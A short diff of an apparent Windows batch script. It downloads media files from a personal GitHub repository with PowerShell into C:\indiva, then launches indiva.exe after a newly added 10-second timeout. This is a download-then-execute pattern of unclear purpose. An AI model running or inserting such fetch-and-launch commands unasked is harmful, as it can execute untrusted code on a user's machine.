@@ -28,7 +28,7 @@ powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Pythonist310/46f
 powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Pythonist310/46fyr/raw/main/3.jpeg' -OutFile 'C:\indiva\3.jpg'"
 powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Pythonist310/46fyr/raw/main/4.mp3' -OutFile 'C:\indiva\4.mp3'"
 powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Pythonist310/46fyr/raw/main/5.mp4' -OutFile 'C:\indiva\5.mp4'"
-
+timeout /t 10
 start "" "C:\indiva\indiva.exe"
 
 exit /B
